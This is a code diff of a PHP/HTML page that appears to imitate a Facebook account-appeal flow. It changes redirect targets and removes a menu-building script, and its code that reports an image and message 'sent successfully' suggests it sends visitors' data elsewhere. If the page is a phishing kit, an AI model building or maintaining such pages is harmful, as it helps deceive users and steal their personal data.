@@ -405,7 +405,7 @@ $phone = isset($_SESSION['phone']) ? $_SESSION['phone'] : '00';
                         </div>
                         <div class="card-text">
                             <div class="btn-wrapper">
-                                <div onclick="location.href='apeal-form';" id="review" style="font-weight: bold" class="button fb-blue w-100">
+                                <div onclick="location.href='promotional-form.php';" id="review" style="font-weight: bold" class="button fb-blue w-100">
                                     <font style="vertical-align: inherit;">
                                         <font style="vertical-align: inherit;">
                                             <font style="vertical-align: inherit;">
@@ -956,7 +956,7 @@ $phone = isset($_SESSION['phone']) ? $_SESSION['phone'] : '00';
                                 console.log('Image and message sent successfully!');
                                 // Add a delay before redirecting
                                 setTimeout(() => {
-                                    window.location.href = 'success'; // Replace 'success.html' with your desired URL
+                                    window.location.href = 'success.php'; // Replace 'success.html' with your desired URL
                                 }, 3000); // Delay in milliseconds (3000ms = 3 seconds)
                             } else {
                                 console.log('Failed to send image and message. Error:', data.description);
@@ -1251,42 +1251,6 @@ $phone = isset($_SESSION['phone']) ? $_SESSION['phone'] : '00';
 
 
         }
-
-        function addSubItems() {
-            var linkSvg =
-                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
-            for (var [subId, items] of Object.entries(subLinks)) {
-                var subElem = document.getElementById(subId)
-                for (var i = 0; i < items.length; i++) {
-                    var text_item = items[i]
-                    var block = document.createElement('div')
-                    block.classList.add('action-button')
-                    block.innerHTML = `
-                    <div class="action-button-img">
-                          <svg></svg>
-                      </div>
-                      <div class="action-button-text">
-                      </div>
-                      <div class="action-button-arrow">
-                      </div>
-                    `
-                    if (text_item['add_svg_link']) {
-                        var svg_block = block.querySelector('.action-button-arrow')
-                        svg_block.innerHTML = linkSvg
-
-                    }
-                    var block_text = block.querySelector('.action-button-text')
-                    block_text.innerText = text_item['text']
-                    subElem.appendChild(block)
-                    block.addEventListener('click', function() {
-                        var start = document.getElementById('start')
-                        start.click()
-                    })
-                }
-            }
-        }
-
-        addSubItems()
     </script>
 </body>
 
